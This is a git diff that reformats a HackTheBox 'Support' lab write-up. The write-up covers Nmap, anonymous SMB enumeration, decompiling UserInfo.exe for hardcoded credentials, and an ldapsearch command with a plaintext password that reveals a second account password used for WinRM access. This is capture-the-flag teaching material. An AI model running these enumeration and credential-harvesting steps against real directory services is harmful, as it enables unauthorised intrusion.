@@ -8,32 +8,29 @@ This write-up details the attack path taken against the Support box on HackTheBo
 
 The initial phase began with an **Nmap** scan that revealed multiple open ports associated with Active Directory services.
 
-<details>
-<summary>See Nmap Results</summary>
+```sh
+❯ sudo nmap -sC -sV -T4 -vv -oA nmapScans/support 10.129.243.69
+Command executed at: 2025-03-04 16:17:59
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-04 16:17 PST
+<SNIP>
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus 
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 00:18:11Z)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl 127
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped    syn-ack ttl 127
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+...
+Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds
+```
 
-    ❯ sudo nmap -sC -sV -T4 -vv -oA nmapScans/support 10.129.243.69
-    Command executed at: 2025-03-04 16:17:59
-    Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-04 16:17 PST
-    <SNIP>
-    PORT     STATE SERVICE       REASON          VERSION
-    53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus 
-    88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 00:18:11Z)
-    135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-    139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
-    389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
-    445/tcp  open  microsoft-ds? syn-ack ttl 127
-    464/tcp  open  kpasswd5?     syn-ack ttl 127
-    593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-    636/tcp  open  tcpwrapped    syn-ack ttl 127
-    3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
-    3269/tcp open  tcpwrapped    syn-ack ttl 127
-    5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-    ...
-    Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds
-
-</details>
-
-### **Did You Know?**
+### **Did You Know? - SMB & LDAP**
 
 > **SMB (Port 445)** is commonly targeted in attacks due to its role in file sharing and authentication. Vulnerabilities like EternalBlue (MS17-010) have been used in major cyberattacks, including WannaCry.
 
@@ -43,31 +40,24 @@ Next, **SMB enumeration** showed that anonymous access was enabled. Listing avai
 
 ```sh
 ❯ smbclient -N -L //10.129.243.69
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+support-tools   Disk      support staff tools
+SYSVOL          Disk      Logon server share 
 ```
 
 ```sh
 ❯ smbclient -N //10.129.243.69/support-tools/
+smb: \> dir support-tools
+.                                   D        0  Wed Jul 20 10:01:06 2022
+..                                  D        0  Sat May 28 04:18:25 2022
+...
+UserInfo.exe.zip                    A   277499  Wed Jul 20 10:01:07 2022
 ```
-
-<details>
-<summary>See Directory Listing</summary>
-
-    Sharename       Type      Comment
-    ---------       ----      -------
-    ADMIN$          Disk      Remote Admin
-    C$              Disk      Default share
-    IPC$            IPC       Remote IPC
-    NETLOGON        Disk      Logon server share 
-    support-tools   Disk      support staff tools
-    SYSVOL          Disk      Logon server share 
-
-    smb: \> dir support-tools
-      .                                   D        0  Wed Jul 20 10:01:06 2022
-      ..                                  D        0  Sat May 28 04:18:25 2022
-      ...
-      UserInfo.exe.zip                    A   277499  Wed Jul 20 10:01:07 2022
-
-</details>
 
 The file was then downloaded for further analysis.
 
@@ -75,7 +65,8 @@ The file was then downloaded for further analysis.
 
 Research indicated that **UserInfo.exe** is a tool used to display Active Directory user information. The accompanying **UserInfo.exe.config** file revealed that it was built using the **.NET Framework**.
 
-### **Did You Know?**
+### **Did You Know? - Decompiling .NET Programs**
+
 > **dnSpy** is a tool that can decompile .NET programs back into source code.
 
 Upon decompiling the executable using dnSpy, a set of hardcoded credentials was discovered.
@@ -126,6 +117,19 @@ Using this, an LDAP query retrieved additional account details:
 
 ```sh
 ❯ ldapsearch -x -H ldap://support.htb -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
+
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+...
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20220528111201.0Z
+uSNCreated: 12617
+info: Ironside47pleasure40Watchful 
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+...
 ```
 
 The LDAP output revealed the support user’s membership in the Shared Support Accounts group and provided the password:
@@ -133,53 +137,6 @@ The LDAP output revealed the support user’s membership in the Shared Support A
 ```txt
 support:Ironside47pleasure40Watchful
 ```
-
-<details>
-<summary>See LDAP Output</summary>
-
-    # support, Users, support.htb
-    dn: CN=support,CN=Users,DC=support,DC=htb
-    objectClass: top
-    objectClass: person
-    objectClass: organizationalPerson
-    objectClass: user
-    cn: support
-    c: US
-    l: Chapel Hill
-    st: NC
-    postalCode: 27514
-    distinguishedName: CN=support,CN=Users,DC=support,DC=htb
-    instanceType: 4
-    whenCreated: 20220528111200.0Z
-    whenChanged: 20220528111201.0Z
-    uSNCreated: 12617
-    info: Ironside47pleasure40Watchful 
-    memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
-    memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
-    uSNChanged: 12630
-    company: support
-    streetAddress: Skipper Bowles Dr
-    name: support
-    objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
-    userAccountControl: 66048
-    badPwdCount: 0
-    codePage: 0
-    countryCode: 0
-    badPasswordTime: 0
-    lastLogoff: 0
-    lastLogon: 0
-    pwdLastSet: 132982099209777070
-    primaryGroupID: 513
-    objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
-    accountExpires: 9223372036854775807
-    logonCount: 0
-    sAMAccountName: support
-    sAMAccountType: 805306368
-    objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
-    dSCorePropagationData: 20220528111201.0Z
-    dSCorePropagationData: 16010101000000.0Z
-
-</details>
 
 This password was then used to establish a WinRM session on port 5985:
 
